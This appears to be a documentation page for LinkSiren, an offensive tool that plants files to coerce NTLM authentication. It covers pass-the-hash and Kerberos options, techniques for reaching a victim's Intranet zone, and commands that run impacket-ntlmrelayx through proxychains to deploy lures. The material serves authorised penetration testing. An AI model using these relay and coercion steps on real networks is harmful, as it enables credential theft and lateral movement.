# Authentication

All four credentialed subcommands (`rank`, `identify`, `deploy`, `cleanup`) accept the same authentication options.

| Method | Flags | Notes |
|---|---|---|
| Password | `[domain/]user:password` | Positional credentials string, the default. |
| Pass-the-Hash | `-no-pass -hashes :<NTHASH>` (or `LM:NT`) plus `[domain/]user` | Bare NT hash form accepted (the leading `:` distinguishes NT from LM). |
| Kerberos | `-no-pass -k -dc-ip <ip-or-fqdn> [domain/]user` | TGT is read from the ccache referenced by `$KRB5CCNAME`. Add `-aesKey <hex>` for AES pre-auth. Target hostnames in the targets file must be FQDNs (Kerberos service tickets bind to `cifs/<hostname>` SPNs, not IPs). If `-dc-ip` is an IP literal, linksiren will attempt to reverse-DNS it to an FQDN so the SPN can be located. |
| Anonymous (NULL session) | `--anonymous` (omit positional credentials) | Useful for share-enumeration recon against misconfigured hosts that do not require authentication. |

## Intranet zoning (HTTP path only)

The **HTTP / WebDAV** path (`.searchConnector-ms`, `.library-ms`, `.url`) only receives NTLM when the attacker URL is in the victim's Intranet Zone. Bare hostnames (no dots) are Intranet by default; FQDNs and IPs are not. Pass a bare hostname to `-a` and the requirement is satisfied without touching the victim.

The **SMB** path (`.lnk` icon UNC, `.url` `IconFile=`) has no zone requirement and fires against any attacker host reachable over 445.

To get intranet-zoned:

* [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/) - full walkthrough.
* [krbrelayx dnstool.py](https://github.com/dirkjanm/krbrelayx) - create AD DNS records as a domain user.
* [DDSpoof](https://github.com/akamai/DDSpoof) - DHCP-based DNS record poisoning, often unauthenticated.
* [Responder](https://github.com/lgandx/Responder) - LLMNR / NBNS / mDNS poisoning fallback.

## Routing through a SOCKS proxy

LinkSiren uses Impacket's standard SMB connection layer, so it routes cleanly through any SOCKS proxy via `proxychains4`, including the SOCKS endpoint published by `impacket-ntlmrelayx -socks`. Typical setup:

```bash
# In one terminal: stage the relay (drop the relayed session in -socks)
impacket-ntlmrelayx -tf relay-targets.txt -smb2support -socks

# In another terminal: identify + deploy via the SOCKS endpoint
proxychains4 linksiren identify -t targets.txt [domain/]user:password
proxychains4 linksiren deploy -a <attacker> [domain/]user:password
```

### SOCKS routing per mode

MSRPC calls that linksiren makes to `\PIPE\svcctl` (SCMR), `\PIPE\efsrpc` (EFSR), and `\PIPE\srvsvc` (share enumeration) all ride the SMB channel on port 445. From the wire perspective they are SMB `CREATE` on a pipe path followed by SMB `WRITE` / `READ` of DCE-RPC PDUs. There is no separate 135 / dynamic-port RPC channel involved. That means SMB-only SOCKS routing (for example, `impacket-ntlmrelayx -socks` with an SMB relayed session) carries every RPC call linksiren makes.

Concretely:

| Mode | Transport | Works over SMB-only SOCKS? |
|---|---|---|
| `check` | SMB | Yes |
| `rank` / `identify` | SMB | Yes |
| `deploy` (including `--encrypt`) | SMB + EFSR via `\PIPE\efsrpc` | Yes |
| `coerce` | SMB + EFSR | Yes |
| `cleanup` (including `--stop-efs` / `--stop-webclient`) | SMB + SCMR via `\PIPE\svcctl` | Yes |
| `target-sessions` | SMB (delegates to deploy) | Yes |
| `detect` | SMB scan | Yes |
| `discover` | LDAP on 389 / 636 | No (needs a parallel LDAP relayed session, or a generic SOCKS5 that reaches the DC on 389/636) |
| `listen` | Local inbound listener | Not applicable |
